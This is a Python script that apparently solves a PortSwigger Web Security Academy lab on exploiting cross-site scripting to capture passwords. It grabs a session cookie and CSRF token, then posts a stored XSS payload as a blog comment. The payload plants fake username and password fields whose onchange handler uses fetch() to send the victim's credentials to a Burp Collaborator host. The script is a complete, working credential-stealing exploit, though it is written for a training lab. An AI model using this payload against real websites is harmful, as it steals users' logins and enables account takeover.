################################################################################
#
# Lab: Exploiting cross-site scripting to capture passwords
#
# Hack Steps: 
#      1. Fetch a post page
#      2. Extract the session cookie and the csrf token to post a comment
#      3. Post a comment with the injected payload in the comment field
#      4. Check you burp collaborator for the victim's username and password 
#         then use these credentials to log in to the victim's account
#
################################################################################
import requests
from colorama import Fore
import re

# Change this to your lab URL
LAB_URL = "https://0a80009104492bc78090127f00250037.web-security-academy.net"

# Change this to your burp collaborator domain
BURP_COLLABORATOR = "lqfaqx3olrzoa3hwllmjez4ar1xsli97.oastify.com"

def main():
    print("â¦—1â¦˜ Fetching a post page.. ", end="", flush=True)

    post_page = fetch_post_page()

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—2â¦˜ Extracting the session cookie and the csrf token to post a comment.. ", end="", flush=True)

    session = post_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", post_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "â¦—3â¦˜ Posting a comment with the injected payload in the comment field.. ", end="", flush=True)

    payload = f"""<input name=username id=username>
                <input name=password type=password
                onchange="if(this.value.length){{fetch('https://{BURP_COLLABORATOR}',{{
                        method:'POST',
                        mode: 'no-cors',
                        body: username.value+':'+this.value
                    }});
                }}">"""
    data = { "comment": payload, "csrf": csrf_token, "postId": "1", "name": "Hacker", "email": "hack@me.com" }
    cookies = { "session": session }
    post_comment(data, cookies)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "ðŸ—¹ Check you burp collaborator for the victim's username and password then use these credentials to log in to the victim's account")


def fetch_post_page():
    try:  
        return requests.get(f"{LAB_URL}/post?postId=1")

    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to fetch a post page through exception")
        exit(1) 


def post_comment(data, cookies):
    try:
        return requests.post(f"{LAB_URL}/post/comment", data, cookies=cookies)

    except:
        print(Fore.RED + "â¦—!â¦˜ Failed to post a comment with the injected payload in the comment field through exception")
        exit(1)


if __name__ == "__main__":
    main()

